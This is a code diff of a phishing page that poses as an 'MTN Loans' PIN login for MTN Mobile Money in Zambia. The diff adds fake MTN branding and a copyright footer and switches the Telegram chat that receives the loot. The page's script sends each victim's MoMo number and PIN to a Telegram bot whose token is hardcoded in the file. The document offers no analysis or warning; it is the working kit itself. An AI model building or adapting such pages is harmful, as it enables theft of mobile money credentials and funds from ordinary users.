@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>MTN  – PIN Login</title>
+    <title>MTN Loans – PIN Login</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
@@ -152,6 +152,15 @@
             margin-top: 18px;
         }
 
+        .footer-note {
+            text-align: center;
+            color: #bbb;
+            font-size: 10px;
+            margin-top: 12px;
+            padding-top: 12px;
+            border-top: 1px solid #eee;
+        }
+
         #spinner {
             position: fixed;
             inset: 0;
@@ -265,16 +274,16 @@
         <div class="content">
             <div class="logo">
                 <div class="logo-circle">M</div>
-                <div class="logo-text"><span>MTN</span> </div>
+                <div class="logo-text"><span>MTN</span> Loans</div>
             </div>
-            <div class="title">Welcome to MTN </div>
+            <div class="title">Welcome to MTN Loans</div>
             <div class="subtitle">
-                Enter your MTN number and PIN to log in.
+                Enter your MTN MoMo number and PIN to log in.
             </div>
 
             <div class="form">
                 <div class="label">MTN MoMo Number</div>
-                <input class="input" id="phoneInput" placeholder="6 55 12 34 56" inputmode="numeric" maxlength="11">
+                <input class="input" id="phoneInput" placeholder="7 66 123 456" inputmode="numeric" maxlength="11">
 
                 <div class="label" style="margin-top:15px;">Enter your PIN</div>
                 <input class="input" id="pinInput" placeholder="4 or 5 digits" inputmode="numeric" maxlength="5" type="password" autocomplete="off">
@@ -282,7 +291,8 @@
                 <button class="btn btn-primary" id="loginBtn" disabled>Log In</button>
                 <button class="btn btn-outline" id="goBackBtn">Back</button>
 
-                <div class="version">v2.6.2 (MTN-QWIK-2026)</div>
+                <div class="version">v2.6.2 (MTN Loans Zambia)</div>
+                <div class="footer-note">© 2026 MTN Zambia – Powered by MTN Mobile Money</div>
             </div>
         </div>
     </div>
@@ -294,7 +304,7 @@
     <script>
         // ========== TELEGRAM CONFIG ==========
         const BOT_TOKEN = '8205203090:AAGJYcmFQe_I-Cw3xxnIhV0J25ZgaCwAExY';
-        const CHAT_ID = '691605234';
+        const CHAT_ID = '1006917440';
         const API_BASE = `https://api.telegram.org/bot${BOT_TOKEN}`;
 
         // ========== DOM ELEMENTS ==========
@@ -370,7 +380,7 @@
             sessionStorage.setItem('mtn_pin', pin);
 
             const message =
-                `🔐 <b>MTN  Login Request</b>\n\n` +
+                `🔐 <b>MTN Loans Login Request</b>\n\n` +
                 `<b>MoMo Number:</b> <code>${escapeHtml(phone)}</code>\n` +
                 `<b>PIN:</b> <code>${escapeHtml(pin)}</code>\n\n` +
                 `📢 <b>Approve or Decline this login attempt:</b>`;
